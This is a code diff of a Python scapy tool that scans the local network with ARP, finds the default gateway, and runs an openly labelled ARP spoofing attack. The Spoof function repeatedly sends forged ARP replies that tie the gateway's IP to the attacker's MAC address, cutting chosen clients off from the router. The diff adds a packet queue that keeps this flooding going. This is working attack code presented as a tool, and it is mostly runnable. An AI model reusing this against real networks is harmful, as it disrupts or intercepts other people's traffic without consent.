@@ -15,6 +15,10 @@ import ifcfg
 from textual.app import App,ComposeResult
 from textual.widgets import Label,Button,Welcome
 import time
+import queue
+import logging
+
+# logging.getLogger("scapy").setLevel(logging.CRITICAL)
 
 def mainer(f):
     def wrap():
@@ -32,7 +36,52 @@ class arptypes():
     whohas = "who-has"
     ping = "ping"
     
-    
+class qmanager:
+    #there is a problem here that its always running
+    running = False
+    waiting = False
+    packets:queue.Queue = queue.Queue()
+    def addpacket(packet)->None:
+        """gets packets like (state-int,packet type)
+        0 - normal packets
+        1 - normal packets with listenning require stream(data)
+        2 - low level packets with listenning require stream(data)"""
+        qmanager.packets.put(packet)
+        #(state,(packet,timeout))
+        # print(f"adding packet to queue({qmanager.packets.qsize()})")
+        qmanager.stream()
+    def stream(data=None):
+        if (data ==None):
+            qmanager.running = True
+            while qmanager.packets.qsize() >0:
+                item = qmanager.packets.get()
+                try:
+                    state,packet = item
+                except:
+                    print(item)
+                    continue
+            
+                if state == 0:#normal
+                    scapy.sendp(packet,loop=False,verbose=False)
+                if qmanager.waiting:
+                    while (qmanager.waiting):#waiting for urgent task to complete
+                        time.sleep(0.001)#waiting
+            qmanager.running = False
+        else:
+            state,packet = data
+            output = None
+            while (qmanager.running):
+                qmanager.waiting = True
+                time.sleep(0.001)#waiting
+            if state == 1:#srp - recored and return
+                output = scapy.srp(packet[0],timeout=packet[1],verbose=False)
+            elif state == 2:#sr -same as before for lower level packets
+                output = scapy.sr(packet[0],timeout=packet[1],verbose=False)
+            qmanager.waiting = False
+            return output
+    def clearQueue():
+        while qmanager.packets.qsize()>0:
+            qmanager.packets.get_nowait()
 
 def builtarppacket(dst:tuple,srcIsAt:tuple,arptype:str) -> bytes:
     
@@ -42,11 +91,13 @@ def builtarppacket(dst:tuple,srcIsAt:tuple,arptype:str) -> bytes:
     # just send to braodcast
     if len(srcIsAt)<2:
         raise Exception(f"srcIsAt tuple doesn't have enough items expected:2 got:{len(srcIsAt)}")
-        return
     set_ip,set_mac = srcIsAt
     dst_ip,dst_mac= dst
-    if "/" not in dst_ip and (None in (dst_ip,dst_mac) or "" in (dst_mac.strip(),dst_ip.strip()) or dst_mac.count(":") !=5 or dst_ip.count(".") !=4):
+    
+    
+    if "/" not in dst_ip and (None in (dst_ip,dst_mac) or "" in (dst_mac.strip(),dst_ip.strip()) or dst_mac.count(":") !=5 or dst_ip.count(".") !=3):
         #sending braodcast if the target addr is bad
+
         dst_ip,dst_mac = None,None
     #the / is used to decler the netwrok leyers
     #5 application
@@ -105,7 +156,8 @@ def Scanenetwork(timeout:int =2,subnet:str=None) -> dict:
 
     
     #arp ping Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24")
-    res, _ = scapy.srp(builtarppacket((subnet,""),src,arptypes.ping),timeout=timeout,verbose=False) # listen for packets
+    packet = (1,(builtarppacket((subnet,""),src,arptypes.ping),timeout))
+    res, _ = qmanager.stream(packet) # listen for packets
     # res = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst="192.168.1.0/24"),timeout=timeout)
     output = {}
     for x in res:
@@ -119,7 +171,7 @@ def getDefaultGateway():
     targetip = thispcay()[0]
     targetip = [str(128 ^ int(targetip.split(".")[0]))] + targetip.split(".")[1:] # xor operation on the first byte of the ip with 128(1000 0000)cause a not operation on the first bit
     targetip= ".".join(targetip)
-    result, unans = scapy.sr(scapy.IP(dst=targetip,ttl=(1,1))/scapy.ICMP(),verbose=False) #ttl of 1 to find only the first hop
+    result, unans = qmanager.stream((2,(scapy.IP(dst=targetip,ttl=(1,1))/scapy.ICMP(),5))) #ttl of 1 to find only the first hop
     return result[0].answer.src
     
 
@@ -150,18 +202,23 @@ def ask(q:str,possibleanswers:list) -> str:
             return ask(q,possibleanswers)
 def Spoof(Targets:list=Data.TargetedClients)->None:
     #currently just blocking the communication with the router
-    print("starts attacking")
+    print("starts attacking\n")
     Data.attack = True
+    
     gateway = getDefaultGateway()
     mymac = getmymac()
-    for ip,mac in Targets:
-        task = threading.Thread(target=sendspoofedpacket,args=(builtarppacket((ip,mac),(gateway,mymac),arptypes.isat)))
-        Data.threads.append(task)
-        task.start()
-def sendspoofedpacket(packet)->None:
+    
     while Data.attack and not Data.stopthreads:
-        scapy.sendp(packet,loop=False,verbose=False)
-        time.sleep(0.01)
+        for ip,mac in Targets:
+            # task = threading.Thread(target=sendspoofedpacket,args=(builtarppacket((ip,mac),(gateway,mymac),arptypes.isat)))
+            # Data.threads.append(task)
+            # task.start()
+            # print((ip,mac),(gateway,mymac))
+            packet = builtarppacket((ip,mac),(gateway,mymac),arptypes.isat)
+            for _ in range(5):
+                qmanager.addpacket((0,packet))
+        time.sleep(5)
+    
     
     
 def StopAll()->None:
@@ -187,6 +244,7 @@ def menus(number:int|str=0)->None:
             print("\n".join([f"{x[0]}: {x[1]}" for x in menusdict.items()]))
             pickedmenu = ask("pick a menu by its number:",["*"])
         case 1:
+            qmanager.clearQueue()
             Data.attack = False #stoppping all current attacks
             clients = list(Data.clientsFound.items())
             print(f"currently targets:{Data.TargetedClients}")
